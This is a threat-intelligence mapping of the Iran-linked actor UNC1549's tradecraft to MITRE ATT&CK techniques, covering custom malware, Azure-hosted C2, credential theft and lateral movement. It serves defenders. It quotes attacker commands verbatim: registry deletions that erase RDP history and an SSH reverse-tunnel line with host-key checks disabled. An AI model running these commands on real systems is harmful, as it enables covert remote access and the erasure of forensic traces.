# UNC1549 — ATT&CK Technique Mapping

> Attribution: Iran-nexus — medium confidence.
> Enriched from public threat reporting (per-technique sources in intel/cti-pipeline.json).

Total techniques mapped: **40** across **13** tactics.

## Reconnaissance

| Technique | ID | Notes |
|---|---|---|
| Search Open Websites/Domains: Social Media | [T1593.001](https://attack.mitre.org/techniques/T1593/001/) | Actors use social-media / professional-network recruitment personas (consistent with Proofpoint TA455 'mimics recruiting on LinkedIn' reporting) to identify and approach IT staff, administrators and defense-sector employees for job-themed social engineering. |
| Gather Victim Network Information: IP Addresses | [T1590.005](https://attack.mitre.org/techniques/T1590/005/) | Before pivoting via third parties, actors review compromised inboxes and identify legitimate business processes (e.g. password-reset requests) to craft authentic-looking lures, gathering victim environment information for follow-on targeting. |
| Phishing for Information: Spearphishing Link | [T1598.003](https://attack.mitre.org/techniques/T1598/003/) | Fake login pages mimicking major companies are used to harvest victim credentials; actors also leverage compromised third-party vendor accounts and inbox contents to obtain privileged-account credentials for onward access. |

## Resource Development

| Technique | ID | Notes |
|---|---|---|
| Acquire Infrastructure: Domains | [T1583.001](https://attack.mitre.org/techniques/T1583/001/) | Actors register look-alike / thematically relevant domains for fake recruitment and lure sites (e.g. airbus.usa-careers[.]com, airplaneserviceticketings[.]com, airtravellog[.]com) used for credential harvesting and C2. |
| Acquire Infrastructure: Web Services | [T1583.006](https://attack.mitre.org/techniques/T1583/006/) | Signature tradecraft: actors provision Microsoft Azure resources — Azure App Service web apps (*.azurewebsites.net) and Azure VMs (*.cloudapp.azure.com across regions such as eastus, westus3, northeurope, uaenorth, qatarcentral) — to host backdoor C2 and tunneler endpoints, blending malicious traffic into trusted cloud infrastructure. |
| Develop Capabilities: Malware | [T1587.001](https://attack.mitre.org/techniques/T1587/001/) | Actors develop and iterate a bespoke malware family (MINIBIKE -> MINIBUS successor, TWOSTROKE, DEEPROOT, LIGHTRAIL, GHOSTLINE, POLLBLEND, DCSYNCER.SLICK, CRASHPAD, SIGHTGRAB, TRUSTTRAP), compiling every post-exploitation payload with a unique hash to defeat hash-based detection. |
| Obtain Capabilities: Code Signing Certificates | [T1588.003](https://attack.mitre.org/techniques/T1588/003/) | Multiple tools (TWOSTROKE, GHOSTLINE, POLLBLEND and others) are signed with legitimate code-signing certificates to evade trust-based controls; GTIG reported the certificates for revocation. |

## Initial Access

| Technique | ID | Notes |
|---|---|---|
| Phishing: Spearphishing Link | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) | Primary initial-access vector: spearphishing emails carrying links to actor-controlled fake job-recruitment websites and Israel-Hamas conflict-themed content sites, tailored with job-themed lures relevant to the recipient's role in aerospace/defense. |
| Valid Accounts | [T1078](https://attack.mitre.org/techniques/T1078/) | Actors authenticate using valid compromised credentials — harvested via fake login pages, phished from third parties, or reset on-network — to access victim environments and remote services. |
| Trusted Relationship | [T1199](https://attack.mitre.org/techniques/T1199/) | Signature pivot: actors abuse trusted third-party vendor, contractor and partner accounts and their Citrix / VMware / Azure Virtual Desktop access to reach aerospace/defense targets, using VDI-breakout techniques to escape virtualized session restrictions into the target network. |

## Execution

| Technique | ID | Notes |
|---|---|---|
| User Execution: Malicious Link | [T1204.001](https://attack.mitre.org/techniques/T1204/001/) | Victims are induced to click links to fake recruitment / lure sites, initiating the credential-harvest and payload-delivery chain. |
| User Execution: Malicious File | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | The lure chain delivers a malicious payload that, when executed by the victim, deploys the MINIBIKE/MINIBUS backdoor onto the host. |

## Persistence

| Technique | ID | Notes |
|---|---|---|
| Hijack Execution Flow: DLL | [T1574.001](https://attack.mitre.org/techniques/T1574/001/) | Core execution/persistence mechanism across nearly the entire toolset (CRASHPAD, DCSYNCER.SLICK, GHOSTLINE, LIGHTRAIL, MINIBIKE, POLLBLEND, SIGHTGRAB, TWOSTROKE): DLL search-order hijacking against legitimate signed software (Fortigate, VMware, Citrix, Microsoft, NVIDIA). Documented example: LIGHTRAIL loaded via VGAuthCLI.exe side-loading a malicious VGAuth.dll; DCSYNCER.SLICK writes to the VMware VGAuth directory. |

## Defense Evasion

| Technique | ID | Notes |
|---|---|---|
| Subvert Trust Controls: Code Signing | [T1553.002](https://attack.mitre.org/techniques/T1553/002/) | Backdoors and tunnelers (TWOSTROKE, GHOSTLINE, POLLBLEND) are signed with legitimate code-signing certificates so they pass signature-trust checks and appear benign. |
| Masquerading | [T1036](https://attack.mitre.org/techniques/T1036/) | Malicious DLLs and output files are placed within legitimate software directories (VMware VMware Tools\VMware VGAuth, VGAuth.dll) and Azure C2 domains are named to imitate benign IT/cloud services (vm-tools-svc, vmware-health-ms, active-internal-logs, mso-intranet-logs) to blend with normal operations. |
| Obfuscated Files or Information: Dynamic API Resolution | [T1027.007](https://attack.mitre.org/techniques/T1027/007/) | Tools such as DCSYNCER.SLICK and SIGHTGRAB use dynamic/runtime API resolution from encoded strings, XOR encryption of strings and removal of printf/debug artifacts to hinder static analysis. |
| Obfuscated Files or Information: Encrypted/Encoded File | [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Data and payloads are XOR-encoded/encrypted — SIGHTGRAB XORs screenshots with single-byte key 0x41; DEEPROOT hex-encodes '-===-' delimited command payloads; LIGHTRAIL uses a custom XOR hash value 0x41424344 ('ABCD'). |

## Impair Defenses

| Technique | ID | Notes |
|---|---|---|
| Indicator Removal: File Deletion | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | Actors delete their utilities from disk immediately after execution to minimize forensic artifacts and defeat post-incident recovery of tooling. |
| Modify Registry | [T1112](https://attack.mitre.org/techniques/T1112/) | Actors clear RDP connection history to erase lateral-movement traces: 'reg delete HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default /va /f' and '...\Terminal Server Client\Servers /f'. |

## Credential Access

| Technique | ID | Notes |
|---|---|---|
| OS Credential Dumping: DCSync | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | Actors use the custom DCSYNCER.SLICK utility (derived from open-source DCSyncer + Mimikatz) to perform DCSync directory-replication credential theft against domain controllers, executing under a compromised DC computer-account context and writing output to LOG.txt (C:\users\public\ or the VMware VGAuth directory). |
| Brute Force: Password Spraying | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Actors perform password-spray attacks against the domain to obtain additional valid credentials. |
| Steal or Forge Kerberos Tickets: Kerberoasting | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Actors run obfuscated Invoke-Kerberoast scripts to request service tickets for offline cracking of service-account credentials. |
| Steal or Forge Authentication Certificates | [T1649](https://attack.mitre.org/techniques/T1649/) | Actors abuse Active Directory Certificate Services (AD CS) to obtain certificates enabling certificate-based authentication/impersonation, and abuse resource-based constrained delegation (RBCD) for directory-replication rights. |
| Credentials from Password Stores: Credentials from Web Browsers | [T1555.003](https://attack.mitre.org/techniques/T1555/003/) | The CRASHPAD utility extracts encrypted browser-stored credentials via the CryptUnprotectData API while impersonating explorer.exe's privilege level; output is written to crash.log in the VMware VGAuth directory. |
| Input Capture: GUI Input Capture | [T1056.002](https://attack.mitre.org/techniques/T1056/002/) | The TRUSTTRAP malware displays a fake credential prompt (e.g. a spoofed Microsoft Outlook login) to trick the user into entering credentials, which are then stored in cleartext to a file. |

## Discovery

| Technique | ID | Notes |
|---|---|---|
| Account Discovery | [T1087](https://attack.mitre.org/techniques/T1087/) | Actors enumerate accounts and groups using native commands (net user, net group) to map the environment for privilege escalation and lateral movement. |
| Domain Trust Discovery | [T1482](https://attack.mitre.org/techniques/T1482/) | Actors run Active Directory Explorer to enumerate the domain, trusts and objects for reconnaissance ahead of credential theft and lateral movement. |

## Lateral Movement

| Technique | ID | Notes |
|---|---|---|
| Remote Services: Remote Desktop Protocol | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | RDP is the actor's most frequent lateral-movement method; they also hijack RDP sessions of identified active users to move between systems. |
| Remote Service Session Hijacking: RDP Hijacking | [T1563.002](https://attack.mitre.org/techniques/T1563/002/) | Actors hijack existing RDP sessions of active users (e.g. via tscon/session takeover) to move laterally using another user's authenticated context. |
| Remote Services: Windows Remote Management | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Actors use PowerShell Remoting (WinRM) to execute commands on remote hosts during lateral movement. |
| Software Deployment Tools | [T1072](https://attack.mitre.org/techniques/T1072/) | Actors abuse Microsoft SCCM Remote Control (via the SCCMVNC tool) for VNC-like remote access that can bypass user consent/notification, using enterprise management infrastructure to reach hosts. |

## Collection

| Technique | ID | Notes |
|---|---|---|
| Data from Information Repositories: SharePoint | [T1213.002](https://attack.mitre.org/techniques/T1213/002/) | Actors browse Microsoft Teams and SharePoint to locate and download files of interest from internal collaboration repositories. |
| Screen Capture | [T1113](https://attack.mitre.org/techniques/T1113/) | The SIGHTGRAB utility autonomously captures periodic screenshots of sensitive data, saving XOR(0x41)-encrypted .jpg files under paths like C:\Users\Public\Videos\YYYY-MM-DD-HH-MM\1.jpg and C:\Users\Public\Music\... |

## Command and Control

| Technique | ID | Notes |
|---|---|---|
| Remote Access Software | [T1219](https://attack.mitre.org/techniques/T1219/) | Actors use commercial/remote-management tooling — Atelier Web Remote Commander (AWRC) — for reconnaissance, credential theft and malware deployment, and fall back to ZeroTier and ngrok for resilient remote access after remediation. |
| Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Backdoors beacon over HTTPS web protocols to Azure App Service (azurewebsites.net) and Azure VM (cloudapp.azure.com) C2; POLLBLEND registers via HTTP POST JSON {"username":"<computer_name>"} to /register/, and LIGHTRAIL uses a hardcoded /news path and a fixed Chrome/Edge User-Agent. |
| Encrypted Channel | [T1573](https://attack.mitre.org/techniques/T1573/) | TWOSTROKE communicates over SSL-encrypted TCP/443; LIGHTRAIL uses Azure WebSocket over HTTPS/443. Encrypted channels conceal C2 content. |
| Proxy | [T1090](https://attack.mitre.org/techniques/T1090/) | Custom tunnelers LIGHTRAIL (modified Lastenzug Socks4a proxy, MAX_CONNECTIONS raised to 5000), GHOSTLINE (go-yamux) and POLLBLEND proxy/relay traffic through Azure endpoints to obscure the true C2 source. |
| Protocol Tunneling | [T1572](https://attack.mitre.org/techniques/T1572/) | Actors establish OpenSSH reverse tunnels for resilient, low-forensic-footprint C2: 'ssh.exe [User]@[IP] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070'; they also use ZeroTier and ngrok tunnels post-remediation. |
| Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | Backdoors (MINIBIKE, TWOSTROKE, DEEPROOT) support downloading files/tools from C2 to the victim host as part of their command sets, staging additional utilities post-compromise. |

## Exfiltration

| Technique | ID | Notes |
|---|---|---|
| Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Backdoors exfiltrate collected files (documents, screenshots, credential output) over their Azure-hosted C2 channels — MINIBIKE/TWOSTROKE/DEEPROOT all implement file-upload-to-C2 commands. |
